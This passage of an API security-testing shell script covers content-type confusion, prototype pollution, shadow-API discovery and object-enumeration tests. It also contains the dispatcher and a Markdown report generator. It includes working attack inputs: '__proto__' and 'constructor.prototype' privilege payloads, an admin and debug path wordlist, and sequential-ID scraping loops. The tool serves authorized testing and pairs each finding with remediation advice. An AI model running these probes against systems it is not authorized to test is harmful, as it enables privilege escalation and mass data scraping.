    if [[ "$form_code" =~ ^(200|201)$ ]] && ! echo "$form_resp" | grep -qi '"error"\|"invalid"\|"unsupported"\|415'; then
        _SUMMARY_CTYPE=1
        emit_finding "medium" \
            "Content-Type Confusion — Form-Encoded Body Accepted on JSON API Endpoint (${ip}:${port})" \
            "API endpoint ${write_ep} accepted application/x-www-form-urlencoded content and returned HTTP ${form_code}. Switching encoding can bypass JSON-specific input validators and WAF rules that only inspect JSON bodies, potentially allowing injection of parameters (admin=true, role=superadmin) that the backend processes from the form-decoded values." \
            "Enforce Content-Type: application/json as the only accepted media type. Return 415 for form-encoded or multipart bodies on JSON API endpoints. Run WAF rules on the decoded parameter values regardless of the encoding used." \
            "ev-24-${ip//./_}-t07-form"
    fi
    _tier_sleep

    # Test 3: Missing Content-Type header
    local nct_code
    nct_code=$(_curl -X POST \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '{"action":"probe_no_ctype"}' \
        -o /dev/null -w "%{http_code}" "$write_ep" || true)
    echo "[T07] No Content-Type probe: HTTP ${nct_code}" >> "$evfile"

    if [[ "$nct_code" =~ ^(200|201)$ ]]; then
        emit_finding "low" \
            "API Endpoint Accepts Request Without Content-Type Header (${ip}:${port})" \
            "API endpoint ${write_ep} returned HTTP ${nct_code} for a POST request sent without a Content-Type header. Without a declared content type, framework auto-detection may parse the body in an unexpected format, and WAF rules relying on Content-Type for body parsing can be bypassed." \
            "Require Content-Type on all POST/PUT/PATCH requests. Return HTTP 400 or 415 if Content-Type is absent. Do not enable framework content-type auto-detection in production." \
            "ev-24-${ip//./_}-t07-no-ctype"
    fi

    [[ "${_SUMMARY_CTYPE}" -eq 0 ]] && log_ok "T07: No content-type confusion vulnerabilities confirmed"
}

# =============================================================================
# MRK:15_T08 — T08 PROTOTYPE POLLUTION | t08,proto,__proto__,constructor | L1156-1240
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t08_proto() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t08-proto" "txt")"
    log "T08: Prototype Pollution — ${base_url}"
    _SUMMARY_PROTO=0

    local api_ep="${base_url}${API_BASE}"
    local -a auth_args=(); mapfile -t auth_args < <(_auth_args)

    # Find a POST/PATCH endpoint that reflects or processes JSON bodies
    local probe_paths=("${api_ep}/users" "${api_ep}/profile" "${api_ep}/settings"
                       "${api_ep}/data"   "${api_ep}/items"   "${api_ep}/resources")
    local probe_ep=""
    for path in "${probe_paths[@]}"; do
        local code; code=$(_curl -X POST -H "Content-Type: application/json" \
            "${auth_args[@]+"${auth_args[@]}"}" \
            -d '{"probe":"apideep24"}' -o /dev/null -w "%{http_code}" "$path" || true)
        if [[ "$code" =~ ^(200|201|400|401|403|422)$ ]]; then
            probe_ep="$path"; break
        fi
    done

    [[ -z "$probe_ep" ]] && { log_ok "T08: No suitable endpoint for prototype pollution"; return; }

    # Attack 1: __proto__ injection via POST body
    local pp1_resp pp1_code
    pp1_resp=$(_curl -X POST -H "Content-Type: application/json" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '{"__proto__":{"admin":true,"role":"admin","isAdmin":true,"privileged":true}}' \
        -w "\n%{http_code}" "$probe_ep" || true)
    pp1_code=$(echo "$pp1_resp" | tail -1)
    local pp1_body; pp1_body=$(echo "$pp1_resp" | head -n -1)
    echo "[T08] __proto__ POST injection: HTTP ${pp1_code} body=${pp1_body:0:400}" >> "$evfile"

    local pp1_reflected=0
    echo "$pp1_body" | grep -qi '"admin":true\|"role":"admin"\|"isAdmin":true\|"privileged":true' && pp1_reflected=1

    if [[ "$pp1_reflected" -eq 1 ]]; then
        _SUMMARY_PROTO=1
        emit_finding "high" \
            "Prototype Pollution — __proto__ Properties Reflected in API Response (${ip}:${port})" \
            "API endpoint ${probe_ep} reflected __proto__ properties (admin:true, role:admin) in its response body when sent a JSON body containing __proto__ as a key. If the server processes the merged object, these properties may pollute the Object prototype chain and affect server-side logic that checks for admin or role properties on plain objects." \
            "Sanitize all incoming JSON bodies by recursively removing or rejecting __proto__, constructor, and prototype keys before processing. Use a library like destr or deep-freeze on parsed objects. Switch to Map instead of plain objects for user-controlled data stores." \
            "ev-24-${ip//./_}-t08-proto-reflect"
    elif [[ "$pp1_code" =~ ^(200|201|202)$ ]]; then
        _SUMMARY_PROTO=1
        emit_finding "medium" \
            "Prototype Pollution Surface — __proto__ Key Accepted Without Rejection (${ip}:${port})" \
            "API endpoint ${probe_ep} accepted a POST body containing __proto__ as a top-level key and returned HTTP ${pp1_code} without an error. The server does not appear to sanitize or reject prototype-polluting keys at the input layer, making it a candidate for server-side prototype pollution." \
            "Add input validation to reject JSON payloads containing __proto__, constructor, or prototype as keys at any nesting depth. Return HTTP 400 for such requests. Use JSON schema validation with an explicit allowlist of permitted keys." \
            "ev-24-${ip//./_}-t08-proto-accepted"
    fi
    _tier_sleep

    # Attack 2: constructor.prototype injection
    local pp2_resp pp2_code
    pp2_resp=$(_curl -X POST -H "Content-Type: application/json" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '{"constructor":{"prototype":{"admin":true,"role":"superadmin"}}}' \
        -w "\n%{http_code}" "$probe_ep" || true)
    pp2_code=$(echo "$pp2_resp" | tail -1)
    local pp2_body; pp2_body=$(echo "$pp2_resp" | head -n -1)
    echo "[T08] constructor.prototype injection: HTTP ${pp2_code} body=${pp2_body:0:400}" >> "$evfile"

    if [[ "$pp2_code" =~ ^(200|201)$ ]] && \
       echo "$pp2_body" | grep -qi '"admin":true\|"role":"superadmin"'; then
        _SUMMARY_PROTO=1
        emit_finding "high" \
            "Prototype Pollution — constructor.prototype Properties Reflected (${ip}:${port})" \
            "API endpoint ${probe_ep} reflected constructor.prototype injected properties in its response. The constructor path is an alternate route to Object prototype pollution that bypasses naive __proto__ key blacklists." \
            "Blocklist both __proto__ and constructor as JSON keys. Prefer an allowlist approach: define the exact expected keys using a schema validator and reject any unexpected keys including nested ones." \
            "ev-24-${ip//./_}-t08-ctor"
    fi
    _tier_sleep

    # Attack 3: Query string prototype pollution
    local qs_pp_resp qs_pp_code
    qs_pp_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
        "${api_ep}/data?__proto__[admin]=true&__proto__[role]=admin" || true)
    qs_pp_code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
        -o /dev/null -w "%{http_code}" \
        "${api_ep}/data?__proto__[admin]=true&__proto__[role]=admin" || true)
    echo "[T08] QS __proto__ injection: HTTP ${qs_pp_code} resp=${qs_pp_resp:0:300}" >> "$evfile"

    if echo "$qs_pp_resp" | grep -qi '"admin":true\|"role":"admin"'; then
        _SUMMARY_PROTO=1
        emit_finding "medium" \
            "Prototype Pollution via Query String — __proto__ Reflected from URL Parameters (${ip}:${port})" \
            "API endpoint reflected __proto__ values from URL query parameters (?__proto__[admin]=true). Query-string prototype pollution can affect server-side qs/querystring library parsing, polluting the Object prototype for the duration of the request." \
            "Disable bracket notation parsing in the query string parser (qs library option: allowPrototypes:false). Sanitize parsed query objects to remove __proto__ and constructor keys before use." \
            "ev-24-${ip//./_}-t08-qs-proto"
    fi

    [[ "${_SUMMARY_PROTO}" -eq 0 ]] && log_ok "T08: No prototype pollution confirmed"
}

# =============================================================================
# MRK:15_T09 — T09 SCHEMA DRIFT & SHADOW API | t09,schema,shadow,zombie,grpc | L1241-1370
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t09_schema() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t09-shadow" "txt")"
    log "T09: Schema Drift & Shadow API Discovery — ${base_url}"
    _SUMMARY_SCHEMA=0

    local -a auth_args=(); mapfile -t auth_args < <(_auth_args)

    # Shadow / internal / admin path wordlist
    local shadow_paths=(
        # Internal/debug paths
        "${API_BASE}/internal"      "${API_BASE}/admin"         "${API_BASE}/debug"
        "${API_BASE}/test"          "${API_BASE}/dev"           "${API_BASE}/private"
        "${API_BASE}/management"    "${API_BASE}/ops"           "${API_BASE}/staff"
        "${API_BASE}/superadmin"    "${API_BASE}/sys"           "${API_BASE}/system"
        # Old API versions (shadow/zombie)
        "/api/v0"                   "/v0"                       "/v0/api"
        "/api/v2"                   "/v2"                       "/v2/api"
        "/api/v3"                   "/v3"                       "/v3/api"
        "/api/beta"                 "/api/alpha"                "/api/legacy"
        # Framework / actuator endpoints
        "/actuator"                 "/actuator/env"             "/actuator/beans"
        "/actuator/health"          "/actuator/metrics"         "/metrics"
        "/debug/vars"               "/debug/pprof"              "/_debug"
        "/trace"                    "/profiler"                 "/__admin"
        # Hidden API entry points
        "/_api"                     "/_internal"                "/api/__internal"
        "/api/config"               "/api/settings/all"         "/api/env"
        "/console"                  "/admin/console"
    )

    local shadow_found=0 admin_found=0

    for path in "${shadow_paths[@]}"; do
        local code; code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
            -o /dev/null -w "%{http_code}" "${base_url}${path}" || true)
        echo "[T09] Shadow probe ${path}: HTTP ${code}" >> "$evfile"

        if [[ "$code" == "200" || "$code" == "201" ]]; then
            local body; body=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}${path}" || true)
            echo "[T09] Shadow response ${path}: ${body:0:400}" >> "$evfile"

            # Classify: admin/debug paths are HIGH; plain shadow APIs are MEDIUM
            local is_sensitive=0
            echo "$path" | grep -qi "admin\|debug\|internal\|actuator\|management\|superadmin\|ops\|env\|config\|profiler\|console\|staff\|sys\|private\|pprof\|vars\|trace" && is_sensitive=1

            if [[ "$is_sensitive" -eq 1 ]] && [[ "$admin_found" -eq 0 ]]; then
                admin_found=1
                _SUMMARY_SCHEMA=1
                _SHADOW_FOUND=1
                emit_finding "high" \
                    "Shadow/Admin API Endpoint Accessible Without Authorisation (${ip}:${port})" \
                    "Sensitive API path ${base_url}${path} returned HTTP 200 and is accessible. Admin, debug, management, and actuator endpoints commonly expose configuration data, environment variables, internal metrics, heap dumps, or privileged operations to unauthenticated or low-privilege callers." \
                    "Restrict all internal, admin, debug, and actuator endpoints to loopback or a trusted management network. Require elevated authentication (separate admin credentials) for management interfaces. Disable debug endpoints entirely in production builds." \
                    "ev-24-${ip//./_}-t09-admin"
            elif [[ "$is_sensitive" -eq 0 ]] && [[ "$shadow_found" -eq 0 ]]; then
                shadow_found=1
                _SUMMARY_SCHEMA=1
                _SHADOW_FOUND=1
                emit_finding "medium" \
                    "Shadow/Zombie API Endpoint Detected — Undocumented Path (${ip}:${port})" \
                    "Undocumented API path ${base_url}${path} returned HTTP 200. Shadow or zombie API versions (e.g., /api/v0, /api/beta) often lack the security controls applied to the current production version, providing an attacker with access to unpatched logic, missing authentication, or deprecated vulnerable operations." \
                    "Maintain a complete inventory of all exposed API routes via OpenAPI spec. Actively decommission old API versions: return 410 Gone rather than leaving legacy paths functional. Use API gateway routing rules to block undocumented paths." \
                    "ev-24-${ip//./_}-t09-shadow"
            fi
        elif [[ "$code" == "403" ]]; then
            echo "$path" | grep -qi "admin\|management\|internal\|actuator" && \
                echo "[T09] Access-controlled admin path exists: ${path} (HTTP 403)" >> "$evfile"
        fi
        _tier_sleep
    done

    # Old API version vs current version divergence check
    local cur_ver_resp other_code
    cur_ver_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
        -o /dev/null -w "%{http_code}" "${base_url}${API_BASE}/${API_VERSION}/users" || true)
    other_code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
        -o /dev/null -w "%{http_code}" "${base_url}/api/v1/users" || true)
    echo "[T09] Version drift: current=${cur_ver_resp} v1=${other_code}" >> "$evfile"

    if [[ "$other_code" == "200" && "$cur_ver_resp" != "200" ]]; then
        _SUMMARY_SCHEMA=1
        emit_finding "medium" \
            "API Version Drift — Older Version Returns Data When Current Rejects (${ip}:${port})" \
            "The older API version path /api/v1/users returned HTTP 200 while the current configured version (${API_VERSION}) path returned ${cur_ver_resp}. Old API versions may lack authentication, rate limiting, or input validation present in the current version." \
            "Decommission old API versions with a sunset policy. Return HTTP 410 Gone for deprecated version paths. Ensure all security controls (authentication, authorization, rate limiting) are version-independent and enforced at the gateway level." \
            "ev-24-${ip//./_}-t09-version-drift"
    fi
    _tier_sleep

    # gRPC reflection endpoint probe
    local grpc_paths=(
        "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"
        "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo"
        "/reflection.v1.ServerReflection/ServerReflectionInfo"
    )
    for gp in "${grpc_paths[@]}"; do
        local grpc_code; grpc_code=$(_curl -X POST \
            -H "Content-Type: application/grpc+json" \
            -H "TE: trailers" \
            -o /dev/null -w "%{http_code}" "${base_url}${gp}" || true)
        echo "[T09] gRPC reflection probe ${gp}: HTTP ${grpc_code}" >> "$evfile"
        if [[ "$grpc_code" =~ ^(200|415|400)$ ]]; then
            _SUMMARY_SCHEMA=1
            emit_finding "info" \
                "gRPC Reflection API Detected (${ip}:${port})" \
                "An HTTP response (${grpc_code}) was received from the gRPC server reflection path ${base_url}${gp}. gRPC server reflection exposes the full protobuf service definitions to any client, enabling attackers to enumerate all service methods and message types without access to source code." \
                "Disable gRPC server reflection in production. Set reflection.register(server) only in development builds. If service discovery is required, restrict the reflection endpoint to authenticated internal clients via mTLS or network policy." \
                "ev-24-${ip//./_}-t09-grpc"
            break
        fi
    done

    [[ "${_SUMMARY_SCHEMA}" -eq 0 ]] && log_ok "T09: No shadow APIs or schema drift detected"
}

# =============================================================================
# MRK:15_T10 — T10 MASS OBJECT ENUMERATION | t10,idor,enum,sequential,uuid | L1371-1470
# NAV-RULE: read-toc-first; deep-only
# =============================================================================

test_15_t10_enum() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t10-enum" "txt")"
    log "T10: Mass Object Enumeration — ${base_url}"
    _SUMMARY_ENUM=0

    local api_ep="${base_url}${API_BASE}"
    local -a auth_args=(); mapfile -t auth_args < <(_auth_args)

    # Resource paths to enumerate
    local resource_paths=("users" "accounts" "orders" "customers" "items"
                          "products" "tickets" "invoices" "reports" "files")
    local enum_ep="" enum_resource=""
    for res in "${resource_paths[@]}"; do
        local code; code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
            -o /dev/null -w "%{http_code}" "${api_ep}/${res}/1" || true)
        echo "[T10] Enum probe ${res}/1: HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|301|302|403)$ ]]; then
            enum_ep="${api_ep}/${res}"
            enum_resource="$res"
            log_info "T10: Enumeration target: ${enum_ep}"
            break
        fi
    done

    if [[ -z "$enum_ep" ]]; then
        log_ok "T10: No enumerable resource endpoint found"
        return
    fi

    # Attack 1: Sequential ID walk
    local found_count=0
    local start="${ENUM_START:-1}"
    local count="${ENUM_COUNT:-10}"
    for id in $(seq "$start" $(( start + count - 1 ))); do
        local resp code
        code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
            -o /dev/null -w "%{http_code}" "${enum_ep}/${id}" || true)
        resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${enum_ep}/${id}" || true)
        echo "[T10] ID ${id}: HTTP ${code} data_len=${#resp}" >> "$evfile"
        if [[ "$code" == "200" ]] && \
           echo "$resp" | grep -qi '"id"\|"email"\|"username"\|"name"\|"account"'; then
            (( found_count++ )) || true
        fi
        _tier_sleep
    done

    echo "[T10] Sequential IDs returning real data: ${found_count}/${count}" >> "$evfile"
    if [[ "$found_count" -ge 3 ]]; then
        _SUMMARY_ENUM=1
        emit_finding "high" \
            "Mass Object Enumeration — Sequential IDs Expose ${found_count} ${enum_resource^} Records (${ip}:${port})" \
            "${found_count} of ${count} sequential ID requests to ${enum_ep}/{id} returned authenticated data with recognisable fields (id, email, username, etc.). Sequential or predictable object IDs allow an attacker to scrape an entire database by incrementing the ID parameter." \
            "Use non-sequential, non-predictable identifiers (UUIDs v4, NanoID, or CSPRNG-derived tokens) as primary keys in externally exposed resources. Enforce object-level authorisation: verify that the authenticated user owns or has access to the requested object ID on every request." \
            "ev-24-${ip//./_}-t10-sequential"
    fi

    # Attack 2: Zero and null ID edge cases
    for edge_id in "0" "null" "undefined" "-1" "99999999"; do
        local edge_code edge_resp
        edge_code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
            -o /dev/null -w "%{http_code}" "${enum_ep}/${edge_id}" || true)
        edge_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${enum_ep}/${edge_id}" || true)
        echo "[T10] Edge ID '${edge_id}': HTTP ${edge_code} resp=${edge_resp:0:200}" >> "$evfile"

        if [[ "$edge_code" == "200" ]] && \
           echo "$edge_resp" | grep -qi '"id"\|"email"\|"username"\|"name"'; then
            _SUMMARY_ENUM=1
            emit_finding "medium" \
                "Object Enumeration — Edge-Case ID '${edge_id}' Returns Data (${ip}:${port})" \
                "Resource endpoint ${enum_ep}/${edge_id} returned HTTP 200 with user data for the edge-case ID value '${edge_id}'. Edge IDs (0, null, -1) sometimes resolve to a default record, admin account, or uninitialized object, exposing unintended data." \
                "Validate that resource IDs match the expected format and range before executing the database lookup. Return HTTP 404 for IDs that do not conform to the expected type (e.g., reject 'null', negative values, or zero for auto-increment IDs)." \
                "ev-24-${ip//./_}-t10-edge-${edge_id}"
            break
        fi
        _tier_sleep
    done

    # Attack 3: Vertical privilege escalation — admin resource path with regular token
    local admin_paths=("${api_ep}/admin/users" "${api_ep}/admin/${enum_resource}"
                       "${api_ep}/users/all"   "${api_ep}/admin/accounts"
                       "${api_ep}/management/users")
    for ap in "${admin_paths[@]}"; do
        local adm_code adm_resp
        adm_code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" \
            -o /dev/null -w "%{http_code}" "$ap" || true)
        adm_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "$ap" || true)
        echo "[T10] Admin path ${ap}: HTTP ${adm_code}" >> "$evfile"

        if [[ "$adm_code" == "200" ]] && \
           echo "$adm_resp" | grep -qi '"id"\|"email"\|"username"'; then
            _SUMMARY_ENUM=1
            emit_finding "high" \
                "Vertical Privilege Escalation — Admin Resource Accessible With Regular Token (${ip}:${port})" \
                "Admin-level resource path ${ap} returned HTTP 200 with user data when accessed with a regular (non-admin) bearer token. This indicates a missing function-level access control (BFLA) check on the admin API path." \
                "Implement role-based access control (RBAC) enforced server-side on every endpoint. Do not rely on the client to omit admin URLs. Explicitly check the caller's role on every admin-prefixed route. Apply an API gateway policy that blocks /admin/ paths for non-admin tokens." \
                "ev-24-${ip//./_}-t10-vertical"
            break
        fi
        _tier_sleep
    done

    [[ "${_SUMMARY_ENUM}" -eq 0 ]] && log_ok "T10: No mass enumeration vulnerabilities confirmed"
}

# =============================================================================
# MRK:15_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | L1471-1530
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

test_target() {
    local host_port="$1"
    local ip port
    IFS=':' read -r ip port <<< "$host_port"
    [[ -z "$port" ]] && port="80"
    _CURRENT_IP="$ip"

    local scheme; scheme=$(_scheme "$port")
    local base_url="${scheme}://${ip}:${port}"
    local ev_dir="${EVIDENCE_BASE}/${ip}_${port}"
    mkdir -p "$ev_dir"

    log "========================================================"
    log "Target: ${base_url}"
    log "========================================================"

    local reach_code
    reach_code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}/" || true)
    if [[ "$reach_code" == "000" ]]; then
        log_warn "Target ${base_url} unreachable (curl exit 000) — skipping"
        return
    fi
    log_ok "Target reachable: HTTP ${reach_code}"

    # Reset per-target cross-test state
    _GQL_ENDPOINT=""; _WS_ENDPOINT=""; _SHADOW_FOUND=0
    _SUMMARY_NOSQL=0; _SUMMARY_GQL=0;  _SUMMARY_WS=0
    _SUMMARY_BIZ=0;   _SUMMARY_HPP=0;  _SUMMARY_APIKEY=0
    _SUMMARY_CTYPE=0; _SUMMARY_PROTO=0; _SUMMARY_SCHEMA=0
    _SUMMARY_ENUM=0
    _FIND_AT_START="${_FIND_CTR}"

    # Dispatch tests — pattern: _test_skip N || test_15_tNN_*()
    _test_skip 1  || test_15_t01_nosql     "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 2  || test_15_t02_gql_adv   "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 3  || test_15_t03_websocket "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 4  || test_15_t04_bizlogic  "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 5  || test_15_t05_hpp       "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 6  || test_15_t06_apikey    "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 7  || test_15_t07_ctype     "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 8  || test_15_t08_proto     "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 9  || test_15_t09_schema    "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 10 || test_15_t10_enum      "$base_url" "$ev_dir" "$ip" "$port"

    local target_finds=$(( _FIND_CTR - _FIND_AT_START ))
    log_ok "Target ${base_url} complete — ${target_finds} finding(s)"

    echo "SUMMARY_ROW|${ip}|${port}|${target_finds}|${_SUMMARY_NOSQL}|${_SUMMARY_GQL}|${_SUMMARY_WS}|${_SUMMARY_BIZ}|${_SUMMARY_HPP}|${_SUMMARY_APIKEY}|${_SUMMARY_CTYPE}|${_SUMMARY_PROTO}|${_SUMMARY_SCHEMA}|${_SUMMARY_ENUM}"
}

# =============================================================================
# MRK:15_MAIN — MAIN ENTRY POINT | main,entry,point,summary | L1531-1680
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

main() {
    log "PT-Orc 15_api_deep.sh v1.0 — Deep API Security"
    log "Session: ${SESSION_TS} | Profile: ${PROFILE} | Tier: ${TIER}"
    [[ "${#CURL_PROXY_ARGS[@]}" -gt 0 ]] && log_info "Intercept proxy: ${CURL_PROXY_ARGS[*]}"
    [[ -n "${API_KEY:-}"       ]] && log_info "API key provided (${#API_KEY} chars)"
    [[ -n "${BEARER_TOKEN:-}"  ]] && log_info "Bearer token provided"
    log_info "API base: ${API_BASE} | Version: ${API_VERSION}"

    setup_profile

    local -a targets
    mapfile -t targets < <(assemble_targets)

    confirm_scope "${targets[@]}"

    if command -v trail_phase_start &>/dev/null; then
        trail_phase_start "15_api_deep" "Deep API Security v1.0" "${#targets[@]} targets"
    fi

    local summary_rows=()

    for host_port in "${targets[@]}"; do
        local row
        row=$(test_target "$host_port")
        while IFS= read -r line; do
            if [[ "$line" == SUMMARY_ROW* ]]; then
                summary_rows+=("$line")
            fi
        done <<< "$row"
    done

    # ── Markdown summary ──────────────────────────────────────────────────────
    local summary_md="${SCRIPT_DIR}/working/$(ev_fname "24-apideep-summary" "md")"
    {
        echo "# API Deep Review Summary — ${PROJECT_NAME:-unknown}"
        echo ""
        echo "**Date:** $(date +'%Y-%m-%d %H:%M:%S')"
        echo "**Profile:** ${PROFILE} | **Tier:** ${TIER} | **Tests:** T01-T10"
        echo "**Targets:** ${#targets[@]}"
        [[ "${#CURL_PROXY_ARGS[@]}" -gt 0 ]] && echo "**Proxy:** ${CURL_PROXY_ARGS[*]}"
        [[ -n "${API_KEY:-}"      ]] && echo "**API Key:** provided (${#API_KEY} chars)"
        echo ""
        echo "## Coverage — Advanced API Attack Patterns"
        echo ""
        echo "| # | Technique | Test | Profile | Status |"
        echo "|---|-----------|------|---------|--------|"
        echo "| T01 | NoSQL Injection | MongoDB/ES/CouchDB operator injection | quick+ | $([ "${_T_ENABLED[1]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T02 | GraphQL Advanced | Alias DoS + depth bypass + field suggestion | standard+ | $([ "${_T_ENABLED[2]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T03 | WebSocket Attacks | CSWSH + auth bypass + unencrypted WS | standard+ | $([ "${_T_ENABLED[3]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T04 | Business Logic Deep | Negative price/qty + overflow + race | deep only | $([ "${_T_ENABLED[4]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped (deep only)") |"
        echo "| T05 | HTTP Param Pollution | Duplicate params + JSON array + PHP arrays | quick+ | $([ "${_T_ENABLED[5]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T06 | API Key Security | Entropy + URL exposure + response leak | quick+ | $([ "${_T_ENABLED[6]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T07 | Content-Type Confusion | XML/form-encoded WAF bypass | quick+ | $([ "${_T_ENABLED[7]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T08 | Prototype Pollution | __proto__ + constructor.prototype + QS | standard+ | $([ "${_T_ENABLED[8]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T09 | Schema Drift & Shadow API | 40-path wordlist + gRPC reflection | standard+ | $([ "${_T_ENABLED[9]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T10 | Mass Object Enumeration | Sequential/edge IDs + vertical priv | deep only | $([ "${_T_ENABLED[10]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped (deep only)") |"
        echo ""
        echo "## Per-Target Results"
        echo ""
        echo "| Host | Port | Finds | NoSQL | GQL | WS | BizLogic | HPP | APIKey | CType | Proto | Shadow | Enum |"
        echo "|------|------|-------|-------|-----|----|----------|-----|--------|-------|-------|--------|------|"
        for row in "${summary_rows[@]+"${summary_rows[@]}"}"; do
            IFS='|' read -r _ rip rport rfinds rnosql rgql rws rbiz rhpp rapikey rctype rproto rschema renum <<< "$row"
            local fn; fn="$( [[ "${rnosql:-0}"  -eq 1 ]] && echo "⚠" || echo "—")"
            local fg; fg="$( [[ "${rgql:-0}"    -eq 1 ]] && echo "⚠" || echo "—")"
            local fw; fw="$( [[ "${rws:-0}"     -eq 1 ]] && echo "⚠" || echo "—")"
            local fb; fb="$( [[ "${rbiz:-0}"    -eq 1 ]] && echo "⚠" || echo "—")"
            local fh; fh="$( [[ "${rhpp:-0}"    -eq 1 ]] && echo "⚠" || echo "—")"
            local fk; fk="$( [[ "${rapikey:-0}" -eq 1 ]] && echo "⚠" || echo "—")"
            local fc; fc="$( [[ "${rctype:-0}"  -eq 1 ]] && echo "⚠" || echo "—")"
            local fp; fp="$( [[ "${rproto:-0}"  -eq 1 ]] && echo "⚠" || echo "—")"
            local fs; fs="$( [[ "${rschema:-0}" -eq 1 ]] && echo "⚠" || echo "—")"
            local fe; fe="$( [[ "${renum:-0}"   -eq 1 ]] && echo "⚠" || echo "—")"
            echo "| ${rip} | ${rport} | ${rfinds} | ${fn} | ${fg} | ${fw} | ${fb} | ${fh} | ${fk} | ${fc} | ${fp} | ${fs} | ${fe} |"
        done
        echo ""
        echo "## Total Findings: ${_FIND_CTR}"
        echo ""
        echo "### Findings File"
        echo "\`${FINDINGS_FILE}\`"
        echo ""
        echo "### Evidence Directory"
        echo "\`${EVIDENCE_BASE}\`"
        echo ""
        echo "---"
        echo "*Generated by PT-Orc 15_api_deep.sh v1.0 — TechGuard Labs*"
        echo "*Profile: ${PROFILE} | NoSQL/GraphQL/WebSocket/BizLogic/HPP/APIKey/CType/Proto/Shadow/Enum*"
    } > "$summary_md"

    log_ok "Summary: ${summary_md}"
    log_ok "Findings: ${FINDINGS_FILE} (${_FIND_CTR} total)"
    log_ok "Evidence: ${EVIDENCE_BASE}"

    if command -v trail_phase_end &>/dev/null; then
        trail_phase_end "15_api_deep" "${_FIND_CTR} findings" "$summary_md"
    fi

    cat "$summary_md"
}

main "$@"

# L2 NAV:v1 → ./LOCAL-INDEX.md
